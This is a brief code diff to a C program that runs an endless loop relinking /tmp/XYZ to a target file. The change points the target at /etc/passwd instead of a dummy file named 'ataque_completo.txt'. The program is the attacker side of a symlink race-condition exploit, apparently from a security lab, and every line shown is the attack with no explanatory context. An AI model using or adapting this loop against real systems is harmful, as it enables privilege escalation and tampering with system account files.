@@ -5,7 +5,7 @@
 int main() {
     while (1) {
         unlink("/tmp/XYZ");
-        symlink("/tmp/ataque_completo.txt", "/tmp/XYZ");
+        symlink("/etc/passwd", "/tmp/XYZ");
     }
     return 0;
 }
